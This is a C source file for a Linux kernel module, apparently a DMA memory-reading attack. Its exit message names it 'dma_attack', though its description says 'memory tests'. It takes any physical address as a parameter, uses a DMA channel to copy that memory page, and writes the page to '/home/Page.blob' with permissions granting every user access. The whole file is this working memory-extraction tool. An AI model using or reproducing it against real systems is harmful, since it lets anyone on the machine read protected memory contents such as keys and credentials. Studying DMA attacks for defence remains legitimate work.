#include <linux/module.h>
#include <linux/delay.h>
#include <linux/fs.h>		/* for file_operations */
#include <linux/version.h>	/* versioning */
#include <linux/highmem.h>
#include <linux/slab.h>
#include <linux/io.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include "../dma_helper.h"

static void dma_reader_cleanup(void)
{
	printk("dma_attack exit\n");
}

static int addr = 0;
module_param(addr,int,0660);

static int __init dma_reader_init(void)
{
	volatile void *start;
	struct file* F;

	char *virtDstPage;
	void *physDstPage;
	void* physSrcPage;
	volatile struct DmaChannelHeader *dmaHeader;

	int dmaChNum = 7;

	start = (void*) ioremap_nocache(dma_start, 4096);

	virtDstPage = (char*)__get_dma_pages(GFP_ATOMIC, 0);
	
	if (virtDstPage == NULL) {
		pr_err("Failed allocated virtDstPage\n");
		return -1;
	}

	memset(virtDstPage, 0, 4096);

	physDstPage = (void *) virt_to_phys(virtDstPage);

	physSrcPage = (void*)addr;

	printk("copy from: %x to %x\n", (uint32_t)physSrcPage, (uint32_t)physDstPage);
	dma_enable(start, dmaChNum);

	// Set the dma header
	dmaHeader = (volatile struct DmaChannelHeader *) (start + (DMACH(dmaChNum)) / 4);

	if (dma_tx(dmaHeader, physSrcPage, physDstPage, 4096) != 0)
	{
		printk("Failed dma tx\n");
		return -1;
	}
	// printk("Read from %x the data: %x\n", physDstPage, *(uint32_t*)virtDstPage);

	F = file_open("/home/Page.blob",  O_CREAT |  O_RDWR | O_APPEND, S_IRWXU | S_IRWXG | S_IRWXO);
	file_write(F, 0, (char*)virtDstPage, 4096);
	file_sync(F); 
	file_close(F);

	free_pages((unsigned long)virtDstPage, 0);


	iounmap(start);
	return 0;
}	

module_init(dma_reader_init);
module_exit(dma_reader_cleanup);

MODULE_DESCRIPTION("memory tests");
MODULE_AUTHOR("Ron Stajnrod");
MODULE_LICENSE("GPL");
